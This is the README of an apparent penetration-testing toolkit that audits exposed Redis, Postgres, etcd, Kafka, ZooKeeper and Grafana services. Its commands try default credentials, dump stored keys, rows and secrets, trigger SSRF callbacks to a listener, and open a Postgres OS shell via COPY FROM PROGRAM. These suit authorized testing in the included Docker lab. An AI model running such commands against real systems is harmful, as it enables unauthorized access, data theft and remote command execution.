# RedPosture

RedPosture is a Python security toolkit for:

- running trigger-driven callback listeners (`exporters trigger --with-listen`) for postgres, redis, proxmox-like API, and blackbox-like endpoints
- discovering exporter and observability endpoints (`exporters scan`)
- triggering detected endpoints to call back to your target (`exporters trigger`)
- collecting debug/runtime endpoints from discovered services (`exporters collect`)
- auditing Redis exposure and weak/default credentials (`redis`)
- auditing Postgres exposure, default credentials, and risky privileges (`postgres`)
- auditing etcd API exposure, auth requirements, and key count (`etcd`)
- auditing Kafka broker auth exposure and topic visibility (`kafka`)
- auditing ZooKeeper exposure, auth requirements, and znode visibility (`zookeeper`)
- auditing Grafana auth exposure, default credentials, and datasource access (`grafana`)

## Installation

### pipx (recommended)

```bash
pipx install "git+https://github.com/MelForze/Redposture.git"
```

### Local install

```bash
python -m pip install -e .
```

## Docker Test Lab

Unified lab is provided via one compose file:
- `docker-compose.lab.yml`: real exporters + seeded Redis/Postgres + synthetic exporter shim.
- Default ports (`3000/9100/9115/9121/9187/9221/9308`) are backed by real services/exporters.
- Additional exporters are exposed on default ports (`9116/9127/9216/9256/9342/9349/9427`) via synthetic shim.
- Kafka labs are included:
  - open broker with seeded topics on `9092`
  - auth-enabled broker (SASL/PLAIN) with seeded topics on `29092` (`metrics:metricspass`)
  - topic payloads are seeded for read tests (`orders`, `audit.logs`, `secure.orders`, `secure.metrics`)
- ZooKeeper lab is included:
  - open ZooKeeper with seeded znodes on `2181`
- etcd labs are included:
  - open etcd with seeded keys on `2379`
  - auth-enabled etcd on `22379`
- Callback-friendly synthetic mirrors for core exporters are also exposed on high ports:
  `19100/19115/19121/19187/19221/19308`.

Start lab:

```bash
docker compose -f docker-compose.lab.yml up -d --build
```

Stop lab:

```bash
docker compose -f docker-compose.lab.yml down -v
```

Quick checks:

```bash
curl -s http://127.0.0.1:9115/metrics | head
curl -s http://127.0.0.1:9308/metrics | head
curl -s http://127.0.0.1:3000/api/health
curl -s -u admin:admin http://127.0.0.1:3000/api/datasources | head
curl -s http://127.0.0.1:9308/debug/vars | head
curl -s "http://127.0.0.1:9308/debug/pprof/cmdline?debug=1" | head
curl -s "http://127.0.0.1:9121/scrape?target=127.0.0.1:6379" | head
curl -s "http://127.0.0.1:9187/probe?target=127.0.0.1:5432" | head
echo ruok | nc 127.0.0.1 2181
curl -s http://127.0.0.1:2379/version
curl -s http://127.0.0.1:2379/v2/keys?recursive=true | head
curl -s http://127.0.0.1:22379/version
docker compose -f docker-compose.lab.yml exec kafka-open kafka-topics --bootstrap-server kafka-open:9092 --list
docker compose -f docker-compose.lab.yml exec kafka-auth bash -ec 'cat >/tmp/client.properties <<EOF
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="metrics" password="metricspass";
EOF
kafka-topics --bootstrap-server kafka-auth:9092 --command-config /tmp/client.properties --list'

redis-cli -h 127.0.0.1 -a redis DBSIZE
redis-cli -h 127.0.0.1 -a redis HGETALL user:1001

psql postgresql://postgres:postgres@127.0.0.1:5432/postgres -c "SELECT username, role FROM redposture.demo_accounts;"
psql postgresql://postgres:postgres@127.0.0.1:5432/postgres -c "SELECT event_type, source_ip FROM redposture.audit_events;"

python3 redposture.py zookeeper -t 127.0.0.1 --show-znodes
python3 redposture.py zookeeper -t 127.0.0.1 -znode /redposture/db/password --dump
```

For `trigger` against real exporter containers, use:

```bash
redposture exporters trigger -t 127.0.0.1 --callback-dns host.docker.internal --profiles-file ./docker/real_lab/profiles.trigger.real.json
```

`profiles.trigger.real.json` includes a Blackbox callback target with Basic Auth (`blackbox:blackbox`) to emulate credentialed callbacks.

Grafana module quick check:

```bash
redposture grafana -t 127.0.0.1 --defcreds
```

## Quick Start

`scan/trigger/collect` are grouped under `exporters`.

### 1) Trigger callbacks (optional listener mode)

Trigger with callback IP:

```bash
redposture exporters trigger -t "10.10.1.10,10.10.1.11" --callback-ip 10.20.122.106
```

Start listeners first, then trigger, then keep listeners running:

```bash
redposture exporters trigger \
  -t "10.10.1.10,10.10.1.11" \
  --callback-ip 10.20.122.106 \
  --callback-dns redposture.example.com \
  --with-listen
```
`--with-listen` order is: listener startup info first, then trigger summary lines, then live incoming listener events.
In this mode TLS listeners also auto-use local `cert.pem` + `key.pem` / `server.crt` + `server.key` if present.

Generate local self-signed cert/key once (without starting any module):

```bash
redposture --selfcert
```

Shortcut alias is also supported:

```bash
redposture --selfcert
```

Custom cert output paths:

```bash
redposture --selfcert --cert-out ./tls/cert.pem --key-out ./tls/key.pem
```

### 2) Scan hosts for endpoints/exporters

```bash
redposture exporters scan -t ./ips.txt -f txt
```

Scan non-standard ports and identify known exporters by `/metrics` markers:

```bash
redposture exporters scan -t 127.0.0.1 -p 9100,9115,9187,9221,19400-19410
```

`--callback-ip` accepts only IP literals (IPv4/IPv6). Use DNS names via `--callback-dns`.

Trigger with callback IP + DNS (both are used):

```bash
redposture exporters trigger \
  -t "10.10.1.10,10.10.1.11" \
  --callback-ip 10.20.122.106 \
  --callback-dns redposture.example.com
```

Tune parallelism and retries:

```bash
redposture exporters trigger \
  -t ./ips.txt \
  --callback-ip 10.20.122.106 \
  --callback-dns redposture.example.com \
  --workers 32 \
  --retries 2
```

Save full trigger/listener events to a txt file (without field truncation):

```bash
redposture exporters trigger \
  -t ./ips.txt \
  --callback-ip 10.20.122.106 \
  -o ./trigger_events.txt
```
When `-o/--output` is set, successful trigger events are written to this file.

### 3) Collect debug endpoints

```bash
redposture exporters collect -t ./ips.txt -f txt
```

`collect` runs in two phases: it first performs discovery scan, then requests debug paths only on detected exporters.

Default collect paths:
- `/debug/vars`
- `/debug/pprof/`
- `/debug/pprof/goroutine?debug=1`
- `/debug/pprof/cmdline?debug=1`
- `/debug/pprof/heap?debug=1`
- `/metrics`

Enable deeper pprof collection:

```bash
redposture exporters collect -t ./ips.txt --deep --pprof-seconds 5 --trace-seconds 2
```

`--deep` additionally requests:
- `/debug/pprof/goroutine?debug=2`
- `/debug/pprof/heap`
- `/debug/pprof/allocs`
- `/debug/pprof/block`
- `/debug/pprof/mutex`
- `/debug/pprof/threadcreate`
- `/debug/pprof/profile?seconds=<pprof-seconds>`
- `/debug/pprof/trace?seconds=<trace-seconds>`

Save exact raw bodies for later validation/parsing:

```bash
redposture exporters collect -t ./ips.txt --save-responses-dir ./collect_raw
```

This creates a directory tree with raw response files and `index.jsonl` metadata.

Validation runs automatically after `collect` (even without saving files).  
It now runs in fixed “max coverage” mode:
- auto-detects text/json content
- validates every collected response
- prints all findings (no line-limit clipping)

Example with saved raw responses:

```bash
redposture exporters collect -t ./ips.txt --save-responses-dir ./collect_raw
```

In `docker-compose.lab.yml`, `kafka-exporter` intentionally simulates a realistic legacy misconfiguration:
metrics are valid, while debug handlers leak runtime config/args. This gives a deterministic validation hit.

Automatic collect validation checks for:
- explicit `CRED` markers in text logs
- key/value patterns like `password=...`, `token=...`, `secret=...`
- credentials embedded in URLs (`scheme://user:pass@...`)
- secret query params in URLs (`access_token=...`, `client_secret=...`, etc.)
- command-line secret flags (`--sasl.password=...`, `--client-secret=...`, etc.)
- Authorization headers (`Basic ...`, `Bearer ...`) and JWT-looking tokens
- private key markers (`-----BEGIN ... PRIVATE KEY-----`) and AWS access key IDs
- JSON fields with sensitive names (`password`, `token`, `secret`, `api_key`, etc.) where value is not empty/masked

### 5) Audit Redis exposure

Check whether authentication is required and count keys by default:

```bash
redposture redis -t ./ips.txt
```

By default this mode performs detection + key counting (`DBSIZE`) without default-credential attempts.

Try default credentials (`redis` / `redis`) explicitly:

```bash
redposture redis -t ./ips.txt --defcreds
```

Check custom credentials:

```bash
redposture redis -t ./ips.txt --username myuser --password mypass
```

Show key names explicitly (names only):

```bash
redposture redis -t ./ips.txt --show-keys
```

Dump a specific key value:

```bash
redposture redis -t ./ips.txt -key app:token
```

Dump all keys with values:

```bash
redposture redis -t ./ips.txt --dump
```

Use non-default Redis port and save results:

```bash
redposture redis -t ./ips.txt --port 6380 --username myuser --password mypass --show-keys --dump -f txt -o ./redis_audit.txt
```

### 6) Audit Postgres exposure

Detect Postgres, check auth requirements, and evaluate risky privileges:

```bash
redposture postgres -t ./ips.txt
```

Check custom credentials:

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass -d appdb
```

Try default credentials (`postgres` / `postgres`) explicitly:

```bash
redposture postgres -t ./ips.txt --defcreds
```

Use non-default Postgres port and save results:

```bash
redposture postgres -t ./ips.txt --port 5433 -d appdb --username appuser --password apppass -f txt -o ./postgres_audit.txt
```

Show readable table names (similar to Redis `--show-keys`):

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --show-tables
```

Show columns from specific table(s) (repeat `--table` or pass comma-separated names):

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --table public.users --table redposture.audit_events --show-columns
```

Show available databases:

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --show-databases
```

Dump rows from all readable tables:

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --dump
```

Dump rows from selected table(s):

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --table public.users --dump
```

Limit columns for `--show-columns` output or `--dump` rows:

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass --table public.users --show-columns --column id --column username --column role
```

Try command execution (when role permissions allow `COPY FROM PROGRAM`) and print output in dump style:

```bash
redposture postgres -t ./ips.txt --username appuser --password apppass -x "id"
```

Interactive command mode (single target) when execution rights are available:

```bash
redposture postgres -t 10.0.0.7 --username appuser --password apppass --os-shell
```

Type commands at `pg-shell>` and use `exit`/`quit` to leave.

The module reports:
- whether target is a Postgres Database
- whether auth is required
- whether credentials are valid (default/provided)
- `superuser` privilege
- ability to execute server-side commands (`pg_execute_server_program` / superuser)
- ability to read tables and readable table count

### 7) Audit etcd exposure

Detect etcd API support (v2/v3), check whether authentication is required, and if auth is not required, return key count:

```bash
redposture etcd -t ./ips.txt
```

Show all accessible key names:

```bash
redposture etcd -t ./ips.txt --show-keys
```

Dump all accessible keys with values:

```bash
redposture etcd -t ./ips.txt --dump
```

Dump one specific key:

```bash
redposture etcd -t ./ips.txt -key /redposture/env
```

Use non-default etcd port and save output:

```bash
redposture etcd -t ./ips.txt --port 22379 -f txt -o ./etcd_audit.txt
```

### 8) Audit Kafka broker exposure

Detect Kafka broker, check whether authentication is required, and show topics when access is available:

```bash
redposture kafka -t ./ips.txt
```

Check auth-enabled broker with credentials (SASL/PLAIN):

```bash
redposture kafka -t ./ips.txt --port 29092 -u metrics -p metricspass
```

Show topic names:

```bash
redposture kafka -t ./ips.txt --show-topics
```

Query one topic:

```bash
redposture kafka -t ./ips.txt --topic orders
```

Read topic messages:

```bash
redposture kafka -t ./ips.txt --topic orders --read-topic
```

`--read-topic` requires `--topic` and reads up to `--max-messages` (default: `1000`).

Read more messages:

```bash
redposture kafka -t ./ips.txt --topic orders --read-topic --max-messages 5000
```

Use non-default Kafka port and save output:

```bash
redposture kafka -t ./ips.txt --port 29092 --show-topics -f txt -o ./kafka_audit.txt
```

### 9) Audit Grafana exposure

Detect Grafana, check whether auth is required, and fetch datasource list when accessible:

```bash
redposture grafana -t ./ips.txt
```

Try default Grafana credentials (`admin:admin`, `admin:prom-operator`):

```bash
redposture grafana -t ./ips.txt --defcreds
```

Check custom credentials and save output:

```bash
redposture grafana -t ./ips.txt -u admin -p 'StrongPass!' -f txt -o ./grafana_audit.txt
```

Use non-default Grafana port:

```bash
redposture grafana -t ./ips.txt --port 3001 --defcreds
```

Show datasource details explicitly:

```bash
redposture grafana -t ./ips.txt --defcreds --show-datasources
```

Run temporary Prometheus egress-check via Grafana (create datasource -> request -> delete datasource):

```bash
redposture grafana -t ./ips.txt --defcreds --ssrf-target https://callback.example.com/probe
```
For lab checks you can pass IP, DNS, or CIDR directly, and optionally force port via `--ssrf-port`:

```bash
redposture grafana -t ./ips.txt --defcreds --ssrf-target 127.0.0.1 --ssrf-port 19115
```
You can also override path/query for generated checks:

```bash
redposture grafana -t ./ips.txt --defcreds --ssrf-target host.docker.internal --ssrf-port 19115 --ssrf-path /debug/vars
```

### 10) Audit ZooKeeper exposure

Detect ZooKeeper and check whether auth is required:

```bash
redposture zookeeper -t ./ips.txt
```

Show znode paths:

```bash
redposture zookeeper -t ./ips.txt --show-znodes
```

Show one znode detail:

```bash
redposture zookeeper -t ./ips.txt -znode /brokers/ids/1
```

Dump one znode value:

```bash
redposture zookeeper -t ./ips.txt -znode /brokers/ids/1 --dump
```

Dump all enumerated znode values:

```bash
redposture zookeeper -t ./ips.txt --dump
```

Tune target port and enumeration cap:

```bash
redposture zookeeper -t ./ips.txt --port 22181 --max-znodes 5000 -f txt -o ./zookeeper_audit.txt
```
If several targets and several ports are set, checks run as all combinations (`targets × ports`).

Use custom exporter profiles from JSON:

```bash
redposture exporters scan -t ./ips.txt --profiles-file ./profiles.json
```

`-t/--targets` supports mixed values in one string:
- IP/DNS: `10.10.1.10,redposture.example.com`
- CIDR: `10.10.1.0/24`
- file path: `./ips.txt` (each line can contain IP/DNS/CIDR; comments with `#` are supported)

## Output

- Runtime events are printed as readable colorized text.
- Credential events are highlighted with `CRED` and include `user=` / `pass=`.
- `scan`, `collect`, `redis`, `postgres`, `etcd`, `kafka`, `zookeeper`, and `grafana` support both `txt` and `json` output via `-f/--format`.
- `scan`, `trigger`, `collect`, `redis`, `postgres`, `etcd`, `kafka`, `zookeeper`, and `grafana` support `--save` (alias of `--output`) to write results to file.
- all modules support `-log/--log <file>` to mirror console output into a log file.
- `scan`, `trigger`, `collect`, `redis`, `postgres`, `etcd`, `kafka`, `zookeeper`, and `grafana` support `--workers` and `--retries`.
- `scan --ports/-p` probes custom port lists/ranges and maps hits to known exporters by marker signatures.
- default `--timeout` is `1.0` second.
- `redis` counts keys by default (`DBSIZE`); use `--show-keys` for key names only, `-key/--key` for one key+value, and `--dump` for all key+value pairs.
- `redis --defcreds` enables default credential attempts (`redis:redis`) on auth-required targets.
- `postgres` counts readable tables by default (`tables:N`); use `--show-tables` to dump table names.
- `postgres --defcreds` enables default credential attempts (`postgres:postgres`) on auth-required targets.
- `postgres --show-databases` prints available database names.
- `postgres --table <name>` selects target table(s) for table-focused actions.
- `postgres --show-columns` prints columns for `--table` targets.
- `postgres --dump` dumps rows from all readable tables.
- `postgres --table <name> --dump` limits dump to selected table(s).
- `postgres --column <name>` filters columns used by `--show-columns` and `--dump` (repeatable; `--columns` is kept as alias).
- `postgres -x/--execute` tries command execution via `COPY FROM PROGRAM` and prints output lines.
- `postgres --os-shell` opens interactive command mode via `COPY FROM PROGRAM` (single target, text output only).
- `etcd` checks API support (`api:v2`, `api:v3`), auth requirement, and key count when no auth is required; use `--show-keys` for names and `--dump` for `key:value`.
- `kafka` checks broker detection, auth requirement, optional provided credentials (`-u/-p`, SASL/PLAIN), and topic visibility.
- `kafka --show-topics` prints topic names after successful access/auth.
- `kafka --topic <name>` prints one topic detail line with partition count or `<not found>`.
- `zookeeper` checks service detection, auth requirement, and znode visibility.
- `zookeeper --show-znodes` prints znode path names.
- `zookeeper -znode/--znode <path>` prints one znode detail line.
- `zookeeper --dump` dumps znode data: with `--znode` dumps only that znode, without `--znode` dumps all enumerated `znode:value` lines.
- `zookeeper --max-znodes <count>` limits recursive znode enumeration per target.
- `grafana` checks service detection, auth requirement, optional default creds (`--defcreds`), and datasource exposure via `/api/datasources`.
- `grafana --show-datasources` (alias `--show-datasource`) prints datasource detail lines.
- `grafana --ssrf-target` + optional `--ssrf-port`/`--ssrf-path` runs temporary Prometheus egress-check (create -> request exact URL path -> cleanup).
- `grafana` check output includes `proxy request: GET /api/datasources/proxy/<id>/...` line for visibility.
- `trigger` (without `--with-listen`) prints a compact summary with detected exporters, attempts, successes, and failures.
- `trigger --with-listen` prints callback flow lines: `SCAN target port [*] Exporter` then `TRIGGER target port [+] Exporter`, followed by detailed listener event line. Non-credential callbacks are marked `(SSRF!)` (orange); credential callbacks are marked `(CRED!)` (orange).
- `trigger` extended summary lines (`TRIGGER host...` / `TRIGGER callback...`) are shown only with `--debug`.

Example runtime lines:

```txt
REDIS    127.0.0.1                        6379   [*] Redis Database (auth required:True)
REDIS    127.0.0.1                        6379   [+] redis:redis (keys:8)
REDIS    127.0.0.1                        6379   [*] Show Keys
REDIS    127.0.0.1                        6379   app:env
REDIS    127.0.0.1                        6379   [*] Dump Keys
REDIS    127.0.0.1                        6379   app:env:local
REDIS    127.0.0.1                        6379   creds:demo:admin:admin
REDIS    127.0.0.1                        6379   [*] Dump Key app:token
REDIS    127.0.0.1                        6379   app:token:<not found>
```

## Commands

```bash
redposture --help
redposture --version
redposture exporters --help
redposture exporters scan --help
redposture exporters collect --help
redposture exporters trigger --help
redposture grafana --help
redposture kafka --help
redposture zookeeper --help
redposture postgres --help
redposture redis --help
redposture etcd --help
redposture --selfcert --help
```

Direct `scan` / `collect` / `trigger` commands are disabled. Use `exporters scan|collect|trigger`.

## Profiles File

`--profiles-file` accepts a JSON object with optional keys:

- `trigger_exporters`
- `discovery_exporters`
- `collect_exporters`
- `collect_debug_endpoints`

`collect_debug_endpoints` may use placeholders:
- `{pprof_seconds}`
- `{trace_seconds}`

Minimal example:

```json
{
  "trigger_exporters": [
    {
      "name": "custom_trigger",
      "port": 9199,
      "detect_path": "/metrics",
      "markers": ["custom_up"],
      "trigger_path": "/probe",
      "target_fmt": "{our_host}:9999"
    }
  ]
}
```

## Safety

Run this tool only in environments where you have explicit authorization.

## License

MIT (`LICENSE`).
